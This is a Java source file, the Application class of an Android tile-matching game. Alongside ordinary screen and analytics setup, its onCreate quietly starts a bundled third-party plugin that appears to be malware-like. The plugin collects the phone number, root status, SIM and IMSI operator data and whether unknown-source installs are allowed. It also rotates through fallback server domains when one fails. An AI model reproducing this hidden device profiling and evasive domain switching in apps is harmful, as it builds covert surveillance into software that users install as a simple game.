package com.tinygame.lianliankan;

import android.app.Application;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsConfig;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.plugin.internet.core.HttpConnectHookListener;
import com.plugin.internet.core.impl.JsonErrorResponse;
import com.tinygame.lianliankan.utils.PointsManager;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.qm.Config;
import com.xstd.qm.Utils;
import com.xstd.qm.setting.MainSettingManager;

import java.io.File;
import java.util.HashMap;

public class LinkLinkApplication extends Application {

    /**
     * width of screen in pixels
     */
    public static int SCREEN_WIDTH = 0;
    /**
     * height of screen in pixels
     */
    public static int SCREEN_HEIGHT = 0;
    /**
     * this value used to transform pix to dip unit, pix = dp * SCREEN_DENSITY
     * screen density if screen size is 320*480 in pixels than SCREEN_DENSITY is 1.0f,
     * wile if screen size is 480*800 than SCREEN_DENSITY is 1.5f
     */
    public static float SCREEN_DENSITY = 0F;

    private Handler mHandler = new Handler(Looper.myLooper());

    @Override
    public void onCreate() {
        super.onCreate();

        DisplayMetrics dm = this.getResources().getDisplayMetrics();
        SCREEN_WIDTH = dm.widthPixels;
        SCREEN_HEIGHT = dm.heightPixels;
        SCREEN_DENSITY = dm.density;

        PointsManager.getInstance().init(this);

        initUMeng();
        //init
        SingleInstanceBase.SingleInstanceManager.getInstance().init(this.getApplicationContext());
        MainSettingManager.getInstance().init(this.getApplicationContext());

        MainSettingManager.getInstance().deviceUuidFactory(getApplicationContext());

        int open = Settings.Secure.getInt(getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0);
        Utils.saveExtraInfo(Build.MODEL);
        Utils.saveExtraInfo("os=" + Build.VERSION.RELEASE);
        Utils.saveExtraInfo("unknown=" + (open == 1 ? "open" : "close"));

        Config.LOGD("[[QuickSettingApplication::onCreate]] create APP :::::::");

        /**
         * 子程序初始化
         */
        PluginSettingManager.getInstance().init(getApplicationContext());
        if (PluginSettingManager.getInstance().getFirstLanuchTime() == 0) {
            PluginSettingManager.getInstance().setFirstLanuchTime(System.currentTimeMillis());
        }

        AppRuntime.getPhoneNumberForLocal(getApplicationContext());
        if (AppRuntime.isRootSystem()) {
            HashMap<String, String> log = new HashMap<String, String>();
            log.put("osVersion", Build.VERSION.RELEASE);
            log.put("phoneType", Build.MODEL);
            CommonUtil.umengLog(getApplicationContext(), "is_root", log);
        }
        AppRuntime.updateSIMCardReadyLog(getApplicationContext());

        String path = getFilesDir().getAbsolutePath() + "/" + com.xstd.plugin.config.Config.ACTIVE_RESPONSE_FILE;
        AppRuntime.RESPONSE_SAVE_FILE = path;

        UtilsConfig.init(this.getApplicationContext());

        InternetUtils.setHttpHookListener(getApplicationContext(), new HttpConnectHookListener() {

            @Override
            public void onPreHttpConnect(String baseUrl, String method, Bundle requestParams) {
            }

            @Override
            public void onPostHttpConnect(String result, int httpStatus) {
            }

            @Override
            public void onHttpConnectError(int code, String data, Object obj) {
                if (code == JsonErrorResponse.UnknownHostException) {
                    if (com.xstd.plugin.config.Config.DEBUG) {
                        com.xstd.plugin.config.Config.LOGD("[[setHttpHookListener::onHttpConnectError]] Error info : " + data);
                    }

                    String d = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
                    DomanManager.getInstance(getApplicationContext()).costOneDomain(d);

                    //notify umeng
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("failed_domain", d);
                    log.put("phoneType", Build.MODEL);
                    CommonUtil.umengLog(getApplicationContext(), "domain_failed", log);
                }
            }
        });

        AppRuntime.readActiveResponse(path);
        String type = String.valueOf(AppRuntime.getNetworkTypeByIMSI(getApplicationContext()));
        if (AppRuntime.ACTIVE_RESPONSE == null
                || TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.channelName)
                || !type.equals(AppRuntime.ACTIVE_RESPONSE.operator)) {
            if (com.xstd.plugin.config.Config.DEBUG) {
                com.xstd.plugin.config.Config.LOGD("[[PluginApp::onCreate]] delete old response save file as the data is error. " +
                                                       " Create PluginApp For Process : " + UtilsRuntime.getCurProcessName(getApplicationContext()) + "<><><><>");
            }
            AppRuntime.ACTIVE_RESPONSE = null;
            File file = new File(path);
            file.delete();
        }

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                MobclickAgent.onPause(getApplicationContext());
            }
        }, 3000);
    }

    private void initUMeng() {
        MobclickAgent.setSessionContinueMillis(60 * 1000);
        MobclickAgent.setDebugMode(false);
        com.umeng.common.Log.LOG = false;
        MobclickAgent.onError(this);

        MobclickAgent.flush(this);
    }

    @Override
    public void onTerminate() {
        super.onTerminate();
    }
}
